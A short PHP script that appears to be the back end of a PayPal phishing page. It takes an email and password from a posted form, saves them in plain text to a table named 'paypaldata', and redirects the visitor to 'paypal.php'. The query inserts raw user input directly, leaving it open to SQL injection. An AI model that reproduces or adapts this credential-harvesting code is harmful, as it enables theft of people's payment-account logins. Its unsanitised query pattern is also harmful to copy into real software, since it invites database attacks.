<?php

    require_once 'config.php';

    if(isset($_POST['submit']))
    {
            $email        = $_POST["email"];
            $password     = $_POST["password"];
           
              

        $result=mysqli_query($conn,"INSERT INTO `paypaldata`(`email`, `password`) VALUES ('$email' ,'$password')");


    if(!empty($result))
    {
      echo "insert success";
    }
    else
    {
        echo "error";
    }

    
}
header("refresh:1 ; url = paypal.php");
?>